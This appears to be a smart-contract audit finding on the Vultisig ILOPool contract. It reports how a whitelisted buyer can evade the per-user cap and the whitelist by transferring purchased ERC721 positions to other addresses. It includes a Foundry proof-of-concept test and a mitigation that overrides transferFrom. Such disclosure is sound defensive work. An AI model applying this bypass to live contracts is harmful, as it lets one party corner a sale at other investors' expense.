# Vulnerability details

# Summary
`ILOPool` contract inherited the oz `ERC721` contract [here](https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOPool.sol#L25). Consequently, the `ILOPool` contract will inherit `transferFrom()` function. The `buy()` function will check `recipient` address whether the address is in the whitelist or not [here](https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOPool.sol#L133). Besides that, each `recipient` is only able to buy at maximum [`saleInfo.maxCapPerUser`](https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOPool.sol#L151):


```
require(raiseAmount <= saleInfo.maxCapPerUser - _position.raiseAmount, "UC");
```

But, any whitelisted addresses can bypass this restriction by buying and transferring the token they own to any addresses they can control as much as they want. If the attackers have enough money, they can `buy()` and call `transferFrom()` multiple times until the [`saleInfo.hardCap`](https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOPool.sol#L136) reached. This will prevent other from buying the liquidity offering.

# Impact
Attackers can dominate the liquidity offering allowing them to control the market.

# Proof of Concept
Here is the proof of concept:

Add the code below to `ILOPoolTest` contract in `test/ILOPool.t.sol`

```solidity
function testBuyAndTransfer() external {
    address receiver1 = makeAddr("receiver1");
    address receiver2 = makeAddr("receiver2");
    uint256 raiseAmount = 50000 ether; // use 50000 ether two times because the hardcap is 100000 ether

    // populate balance for receiver1 to buy liquidity offering
    vm.prank(receiver1);
    IERC20(USDC).approve(iloPool, 1000000000 ether);
    _writeTokenBalance(USDC, receiver1, 1000000000 ether);
    assertEq(IERC20(USDC).balanceOf(receiver1), 1000000000 ether);

    // populate balance for receiver2 to buy liquidity offering
    vm.prank(receiver2);
    IERC20(USDC).approve(iloPool, 1000000000 ether);
    _writeTokenBalance(USDC, receiver2, 1000000000 ether);
    assertEq(IERC20(USDC).balanceOf(receiver2), 1000000000 ether);

    // receiver1 try to buy but must fail because it is not whitelisted
    vm.expectRevert(bytes("UA"));
    _buy(SALE_START+1, raiseAmount);

    // receiver2 must fail too
    vm.expectRevert(bytes("UA"));
    _buy(SALE_START+1, raiseAmount);

    // the _prepareBuyFor() function will add the INVESTOR to the whitelist 
    _prepareBuyFor(INVESTOR);
    // INVESTOR buy 50000 ether for the first time
    (uint256 tokenId, uint128 liquidity) = _buy(SALE_START+1, raiseAmount);

    // transfer ownership to receiver1
    vm.prank(INVESTOR);
    IERC721(iloPool).transferFrom(INVESTOR, receiver1, tokenId);
    assertEq(IERC721(iloPool).balanceOf(receiver1), 1);

    // INVESTOR buy 50000 ether for the second time, INVESTOR buy 100000 ether in total
    (tokenId, liquidity) = _buy(SALE_START+1, raiseAmount);

    // transfe rownership to receiver2
    vm.prank(INVESTOR);
    IERC721(iloPool).transferFrom(INVESTOR, receiver2, tokenId);
    assertEq(IERC721(iloPool).balanceOf(receiver2), 1);

    // project manager launches the project
    _writeTokenBalance(SALE_TOKEN, iloPool, 400000000000000000032531);
    vm.warp(SALE_END + 1);
    vm.prank(address(iloManager));
    IILOPool(iloPool).launch();

    vm.warp(VEST_END_0);

    // now the non whitelisted addresses can claim
    tokenId = IERC721Enumerable(iloPool).tokenOfOwnerByIndex(receiver1, 0);
    vm.prank(receiver1);
    (uint256 amount0, uint256 amount1) = IILOPool(iloPool).claim(tokenId);
    assertGt(amount0, 0);
    assertGt(amount1, 0);

    tokenId = IERC721Enumerable(iloPool).tokenOfOwnerByIndex(receiver2, 0);
    vm.prank(receiver2);
    (amount0, amount1) = IILOPool(iloPool).claim(tokenId);
    assertGt(amount0, 0);
    assertGt(amount1, 0);

}

```

Runt the test:
> $ forge test --match-contract ILOPoolTest --match-test testBuyAndTransfer -vvv

The test should pass. 

The `receiver1` and `receiver2` don't have the right to `buy()` but whitelisted `INVESTOR` could `buy()` and send the tokens to them. Also they can claim those tokens after the vesting date is started.

# Recommended Mitigation
Because the `ILOPool` contract wants to be compatible with `ERC721` contract and also doesn't want to break the whitelist rule. We can override the `transferFrom()` function and add the `_isWhitelisted()` checking for the sender and the receiver addresses to make sure they are eligible to own the given token.

```solidity
function transferFrom(address from, address to, uint256 tokenId) public override(ERC721, IERC721) {
    require(_isWhitelisted(from), "UA");
    require(_isWhitelisted(to), "UA");
    super.transferFrom(from, to, tokenId);
}
```

We also can emit `ERC721InvalidSender(address sender)` and `ERC721InvalidReceiver(address receiver)` errors to be fully compatible with the error messages.
